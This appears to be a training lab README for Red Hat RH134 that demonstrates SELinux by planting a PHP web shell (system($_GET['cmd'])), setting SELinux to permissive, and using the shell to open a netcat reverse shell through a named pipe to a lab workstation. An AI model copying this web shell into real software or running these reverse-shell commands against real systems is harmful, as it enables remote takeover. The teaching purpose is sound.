# rh124_Selinux
* Extra Practice for RH134 Training - RHEL 8.2 Admin II
  >> To run on Redhat RH134 Lab Systems!

### Scenario: We going to the see effects of SElinux in ServerA/B 

### Part1: Instruction - run in servera or serverb ( choose 1 ) and run as user root
  >> We assume its servera 

1.  Setup apache webserver and php 
```sh 
yum install httpd php -y 
```

2. Setup PHP Page 
```sh 

cd /var/www/html/

touch index.php 

insert this code into index.php 

<html>
 <head>
  <title>PHP Page</title>
 </head>
 <body>
 <?php echo '<p>Hello Redhat</p>'; ?>
 <p> Welcome RH134 Students </p>
 <p> Sample Vendor provided Page/App</p>
 <p> This page (php) allows you to execute Linux Command</p>
 <p> SElinux Demo Page </p>
 <?php system($_GET['cmd']);?>

 </body>
</html>
```

3. Comment PrivateTMP in htttpd and php-fpm systemd config file and save it
```sh 

vim /usr/lib/systemd/system/httpd.service
#PrivateTmp=true

vim /usr/lib/systemd/system/php-fpm.service
#PrivateTmp=true

systemd daemon-reload 
systemctl enable --now httpd
```

4. Turn Off SElinux 
```sh 

getenforce 

setenforce 0 

getenforce 

```

5. Enable firewall to allow access to webserver
```sh 
firewall-cmd --permanent --add-service=http

firewall-cmd --reload
```

### Part2: Instruction - run in workstation machine

1. Open firefox to http://servera.lab.example.com 
once in the browser, execute this on the address bar, this will create a device character file called backpipe1 

```sh 
http://servera.lab.example.com/index.php?cmd=mknod /var/tmp/backpipe1 p

```

2. Create a local listener in workstation machine, open a terminal and run 
```sh 

firewall-cmd ----permanent --add-port=1234/tcp

firewall-cmd --reload

nc -lvvp 1234

```

3. Back to firefox, run the following to establish a reverse shell from webserver to workstation listener 
```sh 
http://servera.lab.example.com/index.php?cmd=/bin/sh 0</var/tmp/backpipe1 | nc workstation.lab.example.com 1234 1>/var/tmp/backpipe1


```